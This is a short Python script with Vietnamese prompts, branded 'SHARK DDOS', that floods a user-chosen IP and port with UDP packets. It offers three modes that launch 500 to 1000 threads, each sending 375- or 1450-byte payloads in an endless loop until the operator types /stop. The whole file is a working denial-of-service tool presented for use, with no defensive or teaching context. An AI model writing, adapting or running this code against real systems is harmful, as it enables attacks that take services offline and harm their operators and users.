import socket
import threading

running = True

def print_banner():
    print("\033[92m\033[3m")  # Xanh + nghiêng
    print("╔══════════════════════╗")
    print("║     SHARK DDOS 🦈     ║")
    print("╚══════════════════════╝")
    print("\033[0m")  # Reset màu

def send_packet(ip, port, size):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((ip, port))
        while running:
            s.send(b"\x99" * size)
    except:
        pass
    finally:
        s.close()

def start_attack(ip, port, method):
    if method == "UDP-Flood":
        for _ in range(1000):
            threading.Thread(target=send_packet, args=(ip, port, 375), daemon=True).start()
    elif method == "UDP-Power":
        for _ in range(1000):
            threading.Thread(target=send_packet, args=(ip, port, 1450), daemon=True).start()
    elif method == "UDP-Mix":
        for _ in range(500):
            threading.Thread(target=send_packet, args=(ip, port, 375), daemon=True).start()
            threading.Thread(target=send_packet, args=(ip, port, 1450), daemon=True).start()

def main():
    global running
    print_banner()
    ip = input("IP: ")
    port = int(input("Port: "))
    method = input("Kiểu (UDP-Flood / UDP-Power / UDP-Mix): ").strip()

    start_attack(ip, port, method)
    print("Đang tấn công... Gõ /stop để dừng")

    while True:
        cmd = input()
        if cmd.strip() == "/stop":
            running = False
            print("Đã dừng.")
            break

main()
